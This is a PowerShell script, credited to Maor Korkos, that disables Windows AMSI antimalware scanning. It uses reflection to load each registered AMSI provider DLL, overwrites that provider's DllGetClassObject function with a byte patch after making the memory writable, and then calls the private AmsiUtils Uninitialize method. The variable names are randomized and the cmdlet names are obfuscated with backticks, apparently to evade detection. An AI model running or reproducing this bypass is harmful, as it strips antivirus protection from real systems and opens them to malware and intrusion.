# Write-Host "AMSI providers' initialization interception"
# Write-Host "-- Maor Korkos (@maorkor)"

# Call Windows APIs with reflection (crediton reflection: http://redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)
# Add-Type causes the code to be written to a temporary file on the disk, then csc.exe is used to compile this code into a binary
# Artifacts on disk may cause AV detection, solution - reflection

# Providers registry enumeration implemented by: https://github.com/R-Secure/AMSI-Bypasses

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $VagueKind,
        [Parameter(Position = 1, Mandatory = $True)] [String] $IronFax
    )

    # Get a reference to System.dll in the GAC
    $BucketDeep = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $FloodFixed = $BucketDeep.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $RunPine = $FloodFixed.GetMethod('GetModuleHandle')
    $ToughPricey = $FloodFixed.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $BloodFace = $RunPine.Invoke($null, @($VagueKind))
    $FryClover = ne`w`-`ob`je`ct IntPtr
    $RoughShake = ne`w`-`ob`je`ct System.Runtime.InteropServices.HandleRef($FryClover, $BloodFace)
    # Return the address of the function
    return $ToughPricey.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$RoughShake, $IronFax))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $SceneMinute = (ne`w`-`ob`je`ct Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $CrySteel = [Void]
    )

    $ManyDonkey = [AppDomain]::CurrentDomain
    $ScareFaint = ne`w`-`ob`je`ct System.Reflection.AssemblyName('ReflectedDelegate')
    $TrucksDreary = $ManyDonkey.DefineDynamicAssembly($ScareFaint, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $AwareSolid = $TrucksDreary.DefineDynamicModule('InMemoryModule', $false)
    $QuietRotten = $AwareSolid.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $TrapStar = $QuietRotten.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $SceneMinute)
    $TrapStar.SetImplementationFlags('Runtime, Managed')
    $StringAvoid = $QuietRotten.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $CrySteel, $SceneMinute)
    $StringAvoid.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $QuietRotten.CreateType()
}
$CornTempt = Get-ProcAddress kernel32.dll LoadLibraryA
$CannonWrong = Get-DelegateType @([String]) ([IntPtr])
$AbruptBleach = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CornTempt,
$CannonWrong)
$BuryFax = Get-ProcAddress kernel32.dll GetProcAddress
$VeinLick = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$ToughPricey = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BuryFax,
$VeinLick)
$ArrestBadge = Get-ProcAddress kernel32.dll VirtualProtect
$SpoonFork = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$SixCrow = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ArrestBadge,
$SpoonFork)

$VeinJump = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$RollTank = 0

foreach ($SuddenFix in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $FatHappen = 'HKLM:\Software\Classes\CLSID\' + $SuddenFix + '\InprocServer32'
    $YakNail = Get-ItemPropertyValue -Name '(Default)' $FatHappen -ErrorAction SilentlyContinue
    if ($YakNail)
    {
        $CryMass = Split-Path $YakNail -leaf
        $SinTumble = $CryMass -replace '"', ""
        $RainyBase = $AbruptBleach.Invoke($SinTumble) 
        if ($RainyBase -ne 0)
        {
            Write-host "[*] Provider found - " $CryMass
            $ClipElated = $ToughPricey.Invoke($RainyBase, "DllGetClassObject")        
            $SixCrow.Invoke($ClipElated, [uint32]$VeinJump.Length, 0x40, [ref]$RollTank)
            [System.Runtime.InteropServices.Marshal]::Copy($VeinJump, 0, $ClipElated, $VeinJump.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$EyesNumber = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$EyesNumber.Invoke($object,$null)
